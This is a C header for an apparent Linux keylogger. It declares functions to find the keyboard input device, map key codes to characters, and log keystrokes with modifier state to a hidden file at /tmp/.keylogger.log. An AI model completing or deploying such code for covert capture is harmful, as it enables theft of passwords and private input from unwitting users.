#ifndef KEYBOARD_LOGGER_H
#define KEYBOARD_LOGGER_H

#include <linux/input.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>

#include "behavior_subject.h"

#define KEY_MAP_SIZE 128
#define BUFFER_SIZE 64
#define LOG_FILE "/tmp/.keylogger.log"

typedef struct {
    const char *normal;
    const char *shifted;
    const char *capslocked;
    const char *shifted_and_capslocked;
} KeyMap;

const char *get_key_name(uint16_t key_code, bool shift_pressed, bool capslock_active);
char *strdup_alloc(const char *s);
char *find_keyboard_device(const char *target_device_name);
void log_key(FILE *fp, BehaviorSubject *subject, bool ctrl_pressed, bool meta_pressed, bool alt_pressed,
             const char *key_name);

#endif  // KEYBOARD_LOGGER_H
